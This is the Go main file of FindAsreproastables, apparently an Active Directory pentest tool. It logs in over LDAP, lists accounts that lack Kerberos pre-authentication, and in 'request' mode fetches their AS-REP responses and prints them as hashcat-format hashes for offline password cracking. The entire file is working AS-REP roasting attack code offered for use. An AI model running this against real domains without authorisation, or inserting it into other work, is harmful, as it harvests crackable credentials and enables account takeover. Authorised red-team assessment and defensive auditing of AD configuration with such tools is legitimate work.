package main

import (
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/TheManticoreProject/FindAsreproastables/core"

	"github.com/TheManticoreProject/Manticore/logger"
	kerberos "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/attacks"
	"github.com/TheManticoreProject/Manticore/network/ldap"
	"github.com/TheManticoreProject/Manticore/windows/credentials"

	"github.com/TheManticoreProject/goopts/parser"
)

var (
	// Configuration
	debug bool
	mode  string

	// Authentication
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string

	// LDAP Connection Settings
	domainController string
	ldapPort         int
	useLdaps         bool
	useKerberos      bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "FindAsreproastables - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0",
	}
	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(false)

	// Configuration flags
	group_config, err := ap.NewArgumentGroup("Configuration")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_config.NewBoolArgument(&debug, "", "--debug", false, "Debug mode.")
		group_config.NewStringArgument(&mode, "-m", "--mode", "find", false, "Mode: find lists accounts; request prints hashcat AS-REP hashes.")
	}
	// LDAP Connection Settings
	group_ldapSettings, err := ap.NewArgumentGroup("LDAP Connection Settings")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_ldapSettings.NewStringArgument(&domainController, "-dc", "--dc-ip", "", true, "IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted, it will use the domain part (FQDN) specified in the identity parameter.")
		group_ldapSettings.NewTcpPortArgument(&ldapPort, "-lp", "--ldap-port", 389, false, "Port number to connect to LDAP server.")
		group_ldapSettings.NewBoolArgument(&useLdaps, "-L", "--use-ldaps", false, "Use LDAPS instead of LDAP.")
		group_ldapSettings.NewBoolArgument(&useKerberos, "-k", "--use-kerberos", false, "Use Kerberos instead of NTLM.")
	}
	// Authentication flags
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", true, "Active Directory domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--username", "", true, "User to authenticate as.")
		group_auth.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_auth.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

func requestHashes(accounts []core.Account, realm, kdc string, out, errOut io.Writer, roast func(string, string, string) (*kerberos.ASREPRoastResult, error)) error {
	failed := 0
	for _, account := range accounts {
		if account.Username == "" {
			fmt.Fprintf(errOut, "[error] %s: missing sAMAccountName\n", account.DN)
			failed++
			continue
		}
		result, err := roast(account.Username, realm, kdc)
		if err != nil {
			fmt.Fprintf(errOut, "[error] %s: %v\n", account.Username, err)
			failed++
			continue
		}
		hash, err := attacks.FormatASREPHash(result.Username, result.Realm, result.EncryptionType, result.CipherText)
		if err != nil {
			fmt.Fprintf(errOut, "[error] %s: %v\n", account.Username, err)
			failed++
			continue
		}
		if _, err := fmt.Fprintln(out, hash); err != nil {
			return fmt.Errorf("write hash output: %w", err)
		}
	}
	if failed > 0 {
		return fmt.Errorf("failed to extract %d of %d accounts", failed, len(accounts))
	}
	return nil
}

func run() error {
	parseArgs()
	if mode != "find" && mode != "request" {
		return fmt.Errorf("invalid mode %q: expected find or request", mode)
	}
	if mode == "find" {
		fmt.Print("FindAsreproastables - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0\n\n")
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		return fmt.Errorf("error creating credentials: %w", err)
	}

	ldapSession, err := ldap.NewSession(domainController, ldapPort, creds, useLdaps, useKerberos)
	if err != nil {
		return fmt.Errorf("error creating LDAP session: %w", err)
	}
	success, err := ldapSession.Connect()
	if !success {
		if err != nil && strings.Contains(err.Error(), "Strong Auth Required") {
			logger.Warn("The domain controller requires signing/encryption. Try using LDAPS: -L -lp 636")
		}
		return fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer ldapSession.Close()

	accounts, err := core.GetAsreproastableAccounts(ldapSession)
	if err != nil {
		return err
	}
	if mode == "request" {
		kdc := domainController
		if kdc == "" {
			kdc = authDomain
		}
		return requestHashes(accounts, authDomain, kdc, os.Stdout, os.Stderr, kerberos.ASREPRoastRC4)
	}

	lenAsreproastables := len(accounts)
	fmt.Printf("Found %d asreproastable users:\n", lenAsreproastables)

	Asreproastable_id := 0
	for _, account := range accounts {
		Asreproastable_id += 1
		if Asreproastable_id < lenAsreproastables {
			logger.Print(fmt.Sprintf("├── %s\n", account.DN))
		} else {
			logger.Print(fmt.Sprintf("└── %s\n", account.DN))
		}
	}

	fmt.Println("Done")
	return nil
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "[error] %v\n", err)
		os.Exit(1)
	}
}
